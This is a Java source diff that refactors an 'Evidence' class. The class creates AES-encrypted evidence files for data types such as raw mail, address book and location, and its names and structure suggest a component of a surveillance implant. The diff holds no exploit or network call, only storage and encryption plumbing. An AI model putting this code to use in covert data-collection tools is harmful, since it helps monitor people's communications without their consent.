@@ -73,7 +73,7 @@ public final class Evidence {
 	public static int EVIDENCE_DELIMITER = 0xABADC0DE;
 
 	/** The Constant TYPE_EVIDENCE. */
-	public static final int[] TYPE_EVIDENCE = new int[] {
+	private static final int[] TYPE_EVIDENCE = new int[] {
 			EvidenceType.INFO,
 			EvidenceType.MAIL_RAW,
 			EvidenceType.ADDRESSBOOK,
@@ -120,6 +120,94 @@ public final class Evidence {
 	/** The enough space. */
 	boolean enoughSpace = true;
 
+	/** The timestamp. */
+	Date timestamp;
+
+	/** The log name. */
+	String logName;
+
+	/** The evidence type. */
+	int evidenceType;
+
+	/** The file name. */
+	String fileName;
+
+	/** The fconn. */
+	AutoFile fconn = null;
+
+	// DataOutputStream os = null;
+	/** The encryption. */
+	Encryption encryption;
+
+	/** The evidence collector. */
+	EvidenceCollector evidenceCollector;
+
+	/** The evidence description. */
+	EvidenceDescription evidenceDescription;
+
+	/** The device. */
+	Device device;
+
+	// Agent agent;
+	/** The agent id. */
+	//int agentId;
+	
+	int typeEvidenceId;
+
+	/** The progressive. */
+	int progressive;
+
+	/** The aes key. */
+	private byte[] aesKey;
+	private byte[] encData;
+
+	/**
+	 * Instantiates a new evidence.
+	 */
+	private Evidence() {
+		evidenceCollector = EvidenceCollector.self();
+		device = Device.self();
+
+		progressive = -1;
+		// timestamp = new Date();
+	}
+
+	/**
+	 * Instantiates a new log.
+	 * 
+	 * @param agentId
+	 *            the agentId
+	 * @param aesKey
+	 *            the aes key
+	 */
+	public Evidence(final int typeEvidenceId, final byte[] aesKey) {
+		this();
+		// #ifdef DBC
+		Check.requires(aesKey != null, "aesKey null");
+		// #endif
+
+		// agent = agent_;
+		this.typeEvidenceId = typeEvidenceId;
+		this.aesKey = aesKey;
+
+		encryption = new Encryption(aesKey);
+
+		// #ifdef DBC
+		// Check.ensures(agent != null, "createLog: agent null");
+		Check.ensures(encryption != null, "encryption null");
+		// #endif
+	}
+
+	/**
+	 * Instantiates a new evidence.
+	 * 
+	 * @param agentId
+	 *            the agent id
+	 */
+	public Evidence(final int typeEvidenceId) {
+		this(typeEvidenceId, Keys.self().getAesKey());
+	}
+
 	/**
 	 * Convert type log.
 	 * 
@@ -136,7 +224,7 @@ public final class Evidence {
 			final int typeLog = TYPE_EVIDENCE[agentPos];
 			return typeLog;
 		}
-
+	
 		// #ifdef DEBUG
 		debug.warn("Wrong agentId conversion: " + agentId);
 		// #endif
@@ -150,7 +238,7 @@ public final class Evidence {
 	 *            the type id
 	 * @return the string
 	 */
-	public static String memoTypeEvidence(final int typeId) {
+	private static String memoTypeEvidence(final int typeId) {
 		switch (typeId) {
 		case 0xFFFF:
 			return "NON";
@@ -224,105 +312,34 @@ public final class Evidence {
 			return "LOC";
 		case 0xEDA1:
 			return "FSS";
-
+	
 		}
 		return "UNK";
 	}
 
-	/** The timestamp. */
-	Date timestamp;
-
-	/** The log name. */
-	String logName;
-
-	/** The evidence type. */
-	int evidenceType;
-
-	/** The file name. */
-	String fileName;
-
-	/** The fconn. */
-	AutoFile fconn = null;
-
-	// DataOutputStream os = null;
-	/** The encryption. */
-	Encryption encryption;
-
-	/** The evidence collector. */
-	EvidenceCollector evidenceCollector;
-
-	/** The evidence description. */
-	EvidenceDescription evidenceDescription;
-
-	/** The device. */
-	Device device;
-
-	// Agent agent;
-	/** The agent id. */
-	int agentId;
-
-	/** The progressive. */
-	int progressive;
-
-	/** The aes key. */
-	private byte[] aesKey;
-	private byte[] encData;
-
 	/**
-	 * Instantiates a new evidence.
-	 */
-	private Evidence() {
-		evidenceCollector = EvidenceCollector.self();
-		device = Device.self();
-
-		progressive = -1;
-		// timestamp = new Date();
-	}
-
-	/**
-	 * Instantiates a new log.
+	 * Enough space.
 	 * 
-	 * @param agentId
-	 *            the agentId
-	 * @param aesKey
-	 *            the aes key
+	 * @return true, if successful
 	 */
-	public Evidence(final int agentId, final byte[] aesKey) {
-		this();
-		// #ifdef DBC
-		Check.requires(aesKey != null, "aesKey null");
-		// #endif
-
-		// agent = agent_;
-		this.agentId = agentId;
-		this.aesKey = aesKey;
-
-		encryption = new Encryption(aesKey);
-
-		// #ifdef DBC
-		// Check.ensures(agent != null, "createLog: agent null");
-		Check.ensures(encryption != null, "encryption null");
-		// #endif
-	}
-
-	/**
-	 * Instantiates a new evidence.
-	 * 
-	 * @param agentId
-	 *            the agent id
-	 */
-	public Evidence(final int agentId) {
-		this(agentId, Keys.self().getAesKey());
-	}
-
-	/**
-	 * Instantiates a new evidence.
-	 * 
-	 * @param log
-	 *            the log
-	 */
-	public Evidence(final Evidence log) {
-		this(log.agentId, log.aesKey);
+	private boolean enoughSpace() {
+		long free = 0;
+	
+		free = Path.freeSpace();
+	
+		if (free < MIN_AVAILABLE_SIZE) {
+			// #ifdef DEBUG
+			if (firstSpace) {
+				firstSpace = false;
+	
+				debug.fatal("not enough space. Free : " + free);
+			}
+			// #endif
+	
+			return false;
+		} else {
+			return true;
+		}
 	}
 
 	/**
@@ -335,6 +352,7 @@ public final class Evidence {
 	 * @return true, if successful
 	 */
 	public synchronized boolean close() {
+		//TODO: rinominare il file
 		final boolean ret = true;
 		encData = null;
 		fconn = null;
@@ -349,7 +367,7 @@ public final class Evidence {
 	 * @return true, if successful
 	 */
 	public synchronized boolean createEvidence(final byte[] additionalData) {
-		return createEvidence(additionalData, convertTypeEvidence(agentId));
+		return createEvidence(additionalData, typeEvidenceId);
 	}
 
 	/**
@@ -370,9 +388,12 @@ public final class Evidence {
 	 * @return true, if successful
 	 */
 	public synchronized boolean createEvidence(final byte[] additionalData,
-			final int logType) {
+			final int typeEvidenceId) {
+		
+		this.typeEvidenceId = typeEvidenceId;
+		
 		// #ifdef DEBUG
-		debug.trace("createLog logType: " + logType);
+		debug.trace("createLog typeEvidenceId: " + typeEvidenceId);
 		// #endif
 
 		// #ifdef DBC
@@ -396,7 +417,7 @@ public final class Evidence {
 		}
 
 		final Vector tuple = evidenceCollector.makeNewName(this,
-				memoTypeEvidence(logType));
+				memoTypeEvidence(typeEvidenceId));
 		// #ifdef DBC
 		Check.asserts(tuple.size() == 5, "Wrong tuple size");
 		// #endif
@@ -444,7 +465,7 @@ public final class Evidence {
 			debug.info("Created: " + fileName);
 			// #endif
 
-			final byte[] plainBuffer = makeDescription(additionalData, logType);
+			final byte[] plainBuffer = makeDescription(additionalData, typeEvidenceId);
 			// #ifdef DBC
 			Check.asserts(plainBuffer.length >= 32 + additionalLen,
 					"Short plainBuffer");
@@ -486,31 +507,6 @@ public final class Evidence {
 		return true;
 	}
 
-	/**
-	 * Enough space.
-	 * 
-	 * @return true, if successful
-	 */
-	private boolean enoughSpace() {
-		long free = 0;
-
-		free = Path.freeSpace();
-
-		if (free < MIN_AVAILABLE_SIZE) {
-			// #ifdef DEBUG
-			if (firstSpace) {
-				firstSpace = false;
-
-				debug.fatal("not enough space. Free : " + free);
-			}
-			// #endif
-
-			return false;
-		} else {
-			return true;
-		}
-	}
-
 	// pubblico solo per fare i test
 	/**
 	 * Make description.
@@ -521,7 +517,7 @@ public final class Evidence {
 	 *            the log type
 	 * @return the byte[]
 	 */
-	public byte[] makeDescription(final byte[] additionalData, final int logType) {
+	public byte[] makeDescription(final byte[] additionalData, final int typeEvidenceId) {
 
 		if (timestamp == null) {
 			timestamp = new Date();
@@ -537,7 +533,7 @@ public final class Evidence {
 
 		evidenceDescription = new EvidenceDescription();
 		evidenceDescription.version = EVIDENCE_VERSION_01;
-		evidenceDescription.logType = logType;
+		evidenceDescription.logType = typeEvidenceId;
 		evidenceDescription.hTimeStamp = datetime.hiDateTime();
 		evidenceDescription.lTimeStamp = datetime.lowDateTime();
 		evidenceDescription.additionalData = additionalLen;
@@ -712,9 +708,11 @@ public final class Evidence {
 	 */
 	public static void info(final String message) {
 		try {
-			final Evidence logInfo = new Evidence(Agent.AGENT_INFO);
-
-			logInfo.atomicWriteOnce(message);
+			// atomic info
+			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(message, true));
+			
+			//final Evidence logInfo = new Evidence(Agent.AGENT_INFO);
+			//logInfo.atomicWriteOnce(message);
 
 		} catch (final Exception ex) {
 			// #ifdef DEBUG
@@ -723,58 +721,6 @@ public final class Evidence {
 		}
 	}
 
-	/**
-	 * Atomic write once.
-	 * 
-	 * @param additionalData
-	 *            the additional data
-	 * @param content
-	 *            the content
-	 */
-	public synchronized void atomicWriteOnce(final byte[] additionalData,
-			final byte[] content) {
-		createEvidence(additionalData);
-		writeEvidence(content);
-		Check.ensures(getEncData().length % 16 == 0, "wrong len");
-		close();
-	}
-
-	/**
-	 * Atomic write once.
-	 * 
-	 * @param bytelist
-	 *            the bytelist
-	 */
-	public synchronized void atomicWriteOnce(final Vector bytelist) {
-		createEvidence(null);
-		writeEvidences(bytelist);
-		close();
-	}
-
-	/**
-	 * Atomic write once.
-	 * 
-	 * @param plain
-	 *            the plain
-	 */
-	public synchronized void atomicWriteOnce(final byte[] plain) {
-		createEvidence(null);
-		writeEvidence(plain);
-		Check.ensures(getEncData().length % 16 == 0, "wrong len");
-		close();
-	}
-
-	/**
-	 * Atomic write once.
-	 * 
-	 * @param string
-	 *            the string
-	 */
-	public synchronized void atomicWriteOnce(final String string) {
-		createEvidence(null);
-		writeEvidence(WChar.getBytes(string, true));
-		close();
-	}
 
 	/**
 	 * Atomic write once.
